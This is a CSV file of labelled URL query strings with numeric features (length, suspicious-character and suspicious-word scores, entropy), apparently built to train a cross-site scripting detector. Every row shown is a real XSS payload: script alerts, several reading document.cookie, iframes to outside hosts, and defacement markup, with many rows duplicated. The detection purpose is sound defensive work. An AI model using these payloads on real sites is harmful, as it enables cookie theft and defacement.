url,len,url_count,evil_char,evil_word,shang,label,,,,,,,,
"text=risottoa""/><iframe src=""http://xssed.com"">+de+setas&commit=IR",0.1096213,1,1,0.666666667,0.320365204,1,,,,,,,,
"id=8""><script>alert(1)</script>",-0.598665151,0,0.777777778,1,-0.194344607,1,,,,,,,,
"search=""><script>alert ('Killer-TR Ownz!')</script><iframe+src=http://i43.tinypic.com/2lksbgo.png>&x=0&y=0",0.91909153,1,1.555555556,2,1.476000885,1,,,,,,,,
"q=""><script>alert(/Killer-TR+Ownz/)</script>",-0.335587326,0,1,1,0.494608785,1,,,,,,,,
"ac=show&id=15&term=""><script>alert('Killer-TR')</script>'""><iframe+src=http://www.reizen-ts.net/IMG/TRK/Turkije_vlag.jpg>&searchoption=1&recursive=1",1.769035271,1,2.111111111,1.333333333,1.369575206,1,,,,,,,,
"cx=004067807135607596739:f-p7rdiyulc&cof=FORID:11&ie=UTF-8&view=searchresults&q=""><script>alert+('Killer-TR')</script>'""><iframe+src=http://www.reizen-ts.net/IMG/TRK/Turkije_vlag.jpg>262",2.538031989,1,2.111111111,1.333333333,2.110628864,1,,,,,,,,
"key=""><script>alert (/ Killer-TR /)</script><h1>Killer-TR was here</h1>",0.210805079,0,1.555555556,2.666666667,0.410789945,1,,,,,,,,
"zoeken=1&zoekwoord=""><script>alert('Killer-TR')</script>'""><iframe+src=http://i43.tinypic.com/2lksbgo.png>",0.91909153,1,1.888888889,1.333333333,1.283952758,1,,,,,,,,
"q=""><script>alert ('Killer-TR')</script>",-0.416534349,0,1,1.333333333,0.230943664,1,,,,,,,,
"v=""></title><script>alert(""XSS"")</script><sty  le>body{visibility:hidden;} html{background-color: Black;}</style>'""><div style=%2  2position: absolute;left: 420px;top: 40px;​​z-index: 10;visibility: visibl  e; color: White; font-size: 40px;""><img src=""http://i28.tinypic.com/1j402t.jpg""%  20style=""height: 400px; width: 400px;"" alt=""By Sony""><br>Insecurity Romani  a<br>by Sony<iframe src =http://www.youtube.com/watch?v=atzIya14uV4"" width=""0""%2  0height=""0"" \></div>",8.224560353,1,5.666666667,13.33333333,1.670672346,1,,,,,,,,
"urloi2=asdfds""><iframe src=""http://xssed.com""><meta name=""",-0.052272746,1,1.111111111,1,0.482185342,1,,,,,,,,
club=<script>a=eval;b=alert;a(b(/Xssed By Pierre/.source));</script>&dobranch=Go,0.392935881,0,0.777777778,2,0.785432064,1,,,,,,,,
la=en&nh=10&col=usuppprd&col=wacjprd&siteID=123112&catID=123155&id=2088334&qt=--><script>alert(document.cookie)</script>&x=0&y=0,1.364300156,0,0.666666667,1,1.169539174,1,,,,,,,,
"uGlobalSearch=""><script>alert('XSS')</script>&x=0&y=0",-0.153456524,0,1,1,0.715559024,1,,,,,,,,
"uGlobalSearch=""><script>alert('XSS')</script>&x=0&y=0",-0.153456524,0,1,1,0.715559024,1,,,,,,,,
"provincia=""><script>alert(document.cookie)</script>",-0.193930036,0,0.777777778,1,0.172198836,1,,,,,,,,
"id=10840""><script>alert(document.cookie)</script>",-0.234403547,0,0.777777778,1,0.531143706,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
